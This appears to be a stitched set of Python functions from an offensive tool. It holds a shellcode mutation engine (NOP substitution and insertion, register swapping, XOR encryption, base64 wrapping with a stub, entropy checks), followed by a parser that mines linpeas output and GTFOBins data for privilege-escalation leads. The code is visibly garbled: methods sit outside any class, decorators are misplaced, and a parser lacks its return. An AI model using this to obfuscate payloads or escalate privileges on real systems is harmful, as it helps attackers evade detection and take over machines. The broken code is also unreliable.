def _nop_substitution(self, data: bytes, arch: str) -> bytes:
    nops = NOP_EQUIVALENTS_X64 if arch == "x64" else NOP_EQUIVALENTS_X86
    result = bytearray()
    i = 0
    while i < len(data):
        if data[i : i + 1] == b"\x90":
            replacement = random.choice(nops)
            result.extend(replacement)
            i += 1
        elif data[i : i + 2] == b"\x66\x90":
            replacement = random.choice(nops)
            result.extend(replacement)
            i += 2
        elif data[i : i + 3] == b"\x0f\x1f\x00":
            replacement = random.choice(nops)
            result.extend(replacement)
            i += 3
        else:
            result.append(data[i])
            i += 1
    return bytes(result)

def _nop_insertion(self, data: bytes, arch: str) -> bytes:
    nops = NOP_EQUIVALENTS_X64 if arch == "x64" else NOP_EQUIVALENTS_X86
    result = bytearray()
    for byte_val in data:
        if random.random() < 0.08:
            result.extend(random.choice(nops))
        result.append(byte_val)
    return bytes(result)

def _register_reassignment(self, data: bytes, arch: str) -> bytes:
    x64_reg_map = {
        b"\x48\x31\xc0": [b"\x48\x31\xdb", b"\x48\x31\xc9", b"\x48\x31\xd2"],
        b"\x48\x31\xdb": [b"\x48\x31\xc0", b"\x48\x31\xc9", b"\x48\x31\xd2"],
        b"\x48\x31\xc9": [b"\x48\x31\xc0", b"\x48\x31\xdb", b"\x48\x31\xd2"],
        b"\x48\x31\xd2": [b"\x48\x31\xc0", b"\x48\x31\xdb", b"\x48\x31\xc9"],
    }
    reg_map = x64_reg_map if arch == "x64" else {}
    result = bytearray(data)
    for original, alternatives in reg_map.items():
        pos = 0
        while True:
            pos = result.find(original, pos)
            if pos < 0:
                break
            chosen = random.choice(alternatives)
            result[pos : pos + len(chosen)] = chosen
            pos += 1
    return bytes(result)

def _xor_encrypt(self, data: bytes, arch: str) -> bytes:
    if self.config.multi_xor:
        return self._multi_xor_encrypt(data)
    key = bytes([random.randint(1, 255)])
    return bytes([b ^ key[0] for b in data]) + key

def _compress_data(self, data: bytes) -> bytes:
    compressed = zlib.compress(data, 9)
    if len(compressed) < len(data):
        return b"\x78\x9C" + compressed[2:]
    return data

def _base64_wrap(self, data: bytes, arch: str) -> bytes:
    encoder_stub_x64 = (
        b"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2"
        b"\x48\x83\xec\x20"
    )
    encoder_stub_x86 = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x83\xec\x10"

    if self.config.compress:
        size_info = struct.pack("<I", len(data))
        combined = encoder_stub_x64 + size_info + data if arch == "x64" else encoder_stub_x86 + size_info + data
    else:
        combined = data

    encoded = base64.b64encode(combined)
    return encoded

@staticmethod

def _estimate_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    freq = [0] * 256
    for b in data:
        freq[b] += 1
    import math
    total = len(data)
    entropy = 0.0
    for count in freq:
        if count > 0:
            p = count / total
            entropy -= p * math.log2(p)
    return round(entropy, 4)

@staticmethod

def decode_xor(data: bytes) -> bytes:
    """Decode single-byte XOR encrypted shellcode.

    Args:
        data: XOR-encrypted bytes with key as last byte.

    Returns:
        Decrypted shellcode bytes.
    """
    if len(data) < 2:
        return data
    key = data[-1]
    key_byte = key if isinstance(key, int) else ord(key)
    return bytes([b ^ key_byte for b in data[:-1]])

@staticmethod

def get_audit_summary(self) -> dict[str, Any]:
    """Return a summary of all mutations applied.

    Returns:
        Dict with variant count, entropy range, size ratios, and SHA-256 list.
    """
    if not self.audit_log:
        return {"variants": 0, "message": "No mutations applied"}

    return {
        "variants": len(self.audit_log),
        "entropy_min": min(m.entropy for m in self.audit_log),
        "entropy_max": max(m.entropy for m in self.audit_log),
        "entropy_avg": round(
            sum(m.entropy for m in self.audit_log) / len(self.audit_log), 4
        ),
        "size_ratio_min": min(m.size_ratio for m in self.audit_log),
        "size_ratio_max": max(m.size_ratio for m in self.audit_log),
        "hashes": [m.sha256 for m in self.audit_log],
        "techniques": [
            m.techniques_applied for m in self.audit_log
        ],
    }

def _parse_kernel_version(version_str: str) -> tuple[int, ...]:
    """Parse a kernel version string into a comparable tuple.

    Args:
        version_str: Raw kernel version (e.g. '5.15.0-91-generic').

    Returns:
        Numeric tuple for comparison (e.g. (5, 15, 0, 91)).
    """
    cleaned = re.sub(r"[-_].*", "", version_str)
    parts = cleaned.split(".")
    try:
        return tuple(int(p) for p in parts)
    except (ValueError, TypeError):
        return (0,)

def parse_linpeas_output(text: str) -> SystemProfile:
    """Extract a structured SystemProfile from linpeas output text.

    Args:
        text: Raw linpeas.sh stdout.

    Returns:
        Populated SystemProfile instance.
    """
    profile = SystemProfile(os_type="linux", raw_linpeas=text)

    kernel_match = re.search(
        r"(?:Linux version|uname\s+-a).*?((\d+\.\d+[\d.]*)\S*)", text, re.IGNORECASE
    )
    if kernel_match:
        profile.kernel_version = kernel_match.group(2).strip(".-")

    distro_match = re.search(
        r"(?:PRETTY_NAME|Description)[:=]\s*\"?(.+?)\"?",
        text,
        re.IGNORECASE,
    )
    if distro_match:
        profile.distro = distro_match.group(1).strip()

    arch_match = re.search(r"(?:Architecture|Machine):\s*(.+)", text, re.IGNORECASE)
    if arch_match:
        profile.arch = arch_match.group(1).strip()

    profile.suid_binaries = re.findall(
        r"(?:Vulnerable to|SUID).*?(/[^\s]+)", text, re.IGNORECASE
    )
    if not profile.suid_binaries:
        profile.suid_binaries = re.findall(
            r"(?:-rws|rws).*?(/(?:usr/|bin/|sbin/|opt/)[^\s\n]+)", text
        )

    profile.capabilities = re.findall(
        r"cap_.*?(?:=|\+).*?(/[^\s]+)", text, re.IGNORECASE
    )

def _load_gtfobins_map() -> dict[str, str]:
    """Load GTFOBins entries from the parquet knowledge base.

    Returns:
        Mapping of binary name to description.
    """
    mapping: dict[str, str] = {}

    try:
        import pandas as pd
    except ImportError:
        return mapping

    parquet_paths = [
        GTFOBINS_PARQUET,
        PARQUET_DIR / "binarios.parquet",
        PARQUET_DIR / "binarios.parquet.gzip",
    ]

    for pq_path in parquet_paths:
        if pq_path.exists():
            try:
                df = pd.read_parquet(pq_path)
                name_col = next(
                    (c for c in df.columns if c.lower() in ("binary", "name", "nombre", "binario")), None
                )
                desc_col = next(
                    (c for c in df.columns if c.lower() in ("description", "info", "category")), None
                )
                if name_col:
                    for _, row in df.iterrows():
                        name = str(row[name_col]).strip()
                        desc = str(row.get(desc_col, "")).strip() if desc_col else ""
                        if name:
                            mapping[name] = desc
                break
            except Exception:
                continue

    return mapping

